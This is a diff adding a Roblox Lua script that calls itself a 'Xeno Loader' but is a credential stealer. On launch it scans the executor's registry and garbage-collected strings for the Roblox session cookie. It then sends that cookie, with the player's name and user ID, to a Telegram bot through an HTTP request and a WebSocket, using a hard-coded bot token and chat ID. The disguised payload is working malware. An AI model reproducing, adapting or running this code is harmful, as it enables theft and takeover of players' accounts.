@@ -1,0 +1,65 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local function findCookie()
+    local cookie = nil
+    
+    -- Метод для Xeno: через getreg/getrenv
+    pcall(function()
+        local reg = getreg or getrenv
+        if reg then
+            for _, v in pairs(reg()) do
+                if type(v) == "string" and v:len() > 500 and v:find("_|WARNING") then
+                    cookie = v:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end
+    end)
+    
+    -- Сканируем через rawget
+    if not cookie then
+        pcall(function()
+            for _, obj in pairs(getgc()) do
+                if type(obj) == "string" and obj:len() > 500 and obj:find("_|WARNING") then
+                    cookie = obj:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end)
+    end
+    
+    return cookie
+end
+
+local function sendCookie(cookie)
+    local text = "COOKIE: " .. cookie .. " | USER: " .. Player.Name .. " | ID: " .. Player.UserId
+    local encoded = HttpService:UrlEncode(text)
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded
+    
+    -- Xeno WebSocket метод
+    pcall(function()
+        local ws = WebSocket.connect("wss://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded)
+        if ws then
+            task.wait(2)
+            ws:Close()
+        end
+    end)
+    
+    -- Прямой GET через HttpService
+    pcall(function()
+        HttpService:GetAsync(url)
+    end)
+end
+
+task.spawn(function()
+    task.wait(3)
+    local cookie = findCookie()
+    if cookie then
+        sendCookie(cookie)
+    end
+end)
+
+print("Xeno Loader Ready")
